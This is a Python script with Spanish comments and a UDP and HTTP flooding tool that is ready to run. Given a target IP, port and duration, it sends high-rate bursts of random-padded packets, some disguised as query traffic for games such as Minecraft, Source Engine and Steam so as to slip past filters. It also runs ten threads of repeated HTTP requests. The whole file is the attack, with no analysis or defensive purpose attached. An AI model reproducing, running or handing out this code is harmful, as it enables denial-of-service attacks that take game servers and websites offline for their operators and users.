import socket
import random
import sys
import time
import threading

def udp_bypass_all(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Game payloads grandes
    game_packets = [
        # Minecraft
        b'\xFE\xFD\x09' + random._urandom(500),
        b'\x00\x00\x00\x00' + random._urandom(400),
        
        # Counter-Strike / Source
        b'\xFF\xFF\xFF\xFFTSource Engine Query\x00' + random._urandom(450),
        b'\xFF\xFF\xFF\xFFdetails\x00' + random._urandom(300),
        
        # Among Us
        b'\x00' * 12 + random._urandom(350),
        
        # Fortnite-like
        random._urandom(800),
        
        # Roblox
        random._urandom(700),
        
        # Call of Duty
        b'\xFF\xFF\xFF\xFFgetinfo\x00' + random._urandom(600),
        
        # GTA Online
        random._urandom(900),
        
        # Steam
        b'\xFF\xFF\xFF\xFF\x55' + random._urandom(550),
        
        # Apex Legends
        b'\xFF\xFF\xFF\xFFinfo\x00' + random._urandom(500),
        
        # Battlefield
        random._urandom(850),
        
        # Valorant-like
        b'\x03\x00\x00\x00' + random._urandom(400),
        
        # Rainbow Six
        b'\x02' + random._urandom(650),
        
        # Dota 2
        b'\xFF\xFF\xFF\xFF\x49' + random._urandom(600),
        
        # Overwatch
        random._urandom(750),
        
        # Rust
        b'\x00\x00\x00\x00' + random._urandom(500),
        
        # ARK Survival
        random._urandom(800),
        
        # PUBG/Warzone
        random._urandom(850),
        
        # Satisfactory (muy grande)
        random._urandom(1200),
    ]
    
    # Bytes pequeños para bypass
    small_bytes = [
        b'\x00', b'\x01', b'\xFF', b'\xFE\xFD',
        b'\x16\x03', b'\x13\x00',  # TLS-like
        b'GET', b'POST', b'HTTP',
        b'\xFF\xFF\xFF\xFF',
        random._urandom(1),
        random._urandom(2),
        random._urandom(3),
        random._urandom(4),
    ]
    
    # Cabeceras HTTP para bypass
    http_headers = [
        b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n',
        b'POST /api HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n',
        b'HEAD / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n',
        b'OPTIONS * HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n',
    ]
    
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            # RÁFAGA MASIVA
            for _ in range(random.randint(50, 200)):
                # 60% game packets, 20% small bytes, 20% HTTP
                rand = random.random()
                
                if rand < 0.6:
                    # Game packet grande
                    packet = random.choice(game_packets)
                elif rand < 0.8:
                    # Bytes pequeños
                    packet = random.choice(small_bytes)
                    if random.random() < 0.5:
                        packet += random._urandom(random.randint(10, 100))
                else:
                    # HTTP bypass
                    packet = random.choice(http_headers)
                
                # Añadir datos random extra
                if random.random() < 0.7 and len(packet) < 1000:
                    packet += random._urandom(random.randint(50, 300))
                
                sock.sendto(packet, (target_ip, target_port))
            
            # Pausa mínima
            time.sleep(0.0005)
            
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    sock.close()

def http_bypass_thread(target_ip, target_port, duration):
    """Thread adicional para HTTP bypass"""
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            
            # HTTP requests variadas
            requests = [
                f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n",
                f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 0\r\n\r\n",
                f"HEAD / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n",
            ]
            
            for _ in range(random.randint(3, 10)):
                request = random.choice(requests)
                sock.send(request.encode())
                time.sleep(0.01)
            
            sock.close()
            
        except:
            pass

def start_attack(target_ip, target_port, duration):
    """Iniciar ataque combinado"""
    
    # UDP bypass principal
    udp_thread = threading.Thread(target=udp_bypass_all, args=(target_ip, target_port, duration))
    udp_thread.daemon = True
    udp_thread.start()
    
    # HTTP bypass adicional
    http_threads = []
    for _ in range(10):
        t = threading.Thread(target=http_bypass_thread, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        http_threads.append(t)
    
    # Esperar duración
    time.sleep(duration)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    start_attack(target_ip, target_port, duration)
